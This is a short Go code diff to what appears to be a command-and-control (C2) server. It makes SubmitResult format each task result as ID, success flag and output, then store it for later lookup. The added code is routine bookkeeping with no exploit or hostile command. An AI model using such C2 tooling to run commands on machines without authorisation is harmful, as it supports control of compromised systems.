@@ -213,6 +213,16 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 		logrus.Errorf("Error: %s", result.Error)
 	}
 
+	// Store the result so GetCommandResult can retrieve it
+	// Format the payload as expected by parseAndStoreCommandResult: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
+	var payload string
+	if result.Success {
+		payload = fmt.Sprintf("%s|true|%s", result.TaskId, string(result.Output))
+	} else {
+		payload = fmt.Sprintf("%s|false|%s", result.TaskId, result.Error)
+	}
+	s.parseAndStoreCommandResult(payload)
+
 	return &pb.TaskAck{
 		Received: true,
 		Message:  "Result received",
